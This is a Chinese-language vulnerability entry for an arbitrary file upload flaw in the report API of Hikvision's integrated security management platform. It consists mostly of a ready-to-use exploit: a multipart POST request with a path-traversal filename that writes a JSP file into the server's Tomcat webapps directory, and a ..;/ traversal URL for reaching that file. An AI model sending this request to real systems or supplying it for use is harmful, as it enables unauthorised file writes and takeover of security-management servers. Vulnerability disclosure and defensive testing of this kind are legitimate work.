# Hikvision 综合安防管理平台 report 任意文件上传漏洞

## 漏洞描述
Hikvision 综合安防管理平台 report接口存在任意文件上传漏洞，攻击者通过构造特殊的请求包可以上传任意文件，获取服务器权限

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
登陆页面

![image-20220824134144287](images/202208241341481.png)

```
WEB-INF/classes/com/Hikvision/svm/controller/ExternalController.class
```

![image-20230828163755020](images/image-20230828163755020.png)


## Payloads
```
WEB-INF/classes/com/Hikvision/svm/controller/ExternalController.class
```
```
WEB-INF/classes/com/Hikvision/svm/business/serivce/impl/ExternalBusinessServiceImpl.class
```
```
POST /svm/api/external/report HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/Hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

<%out.print("test");%>

------WebKitFormBoundary9PggsiM755PLa54a--
```
```
/portal/ui/login/..;/..;/new.jsp
```
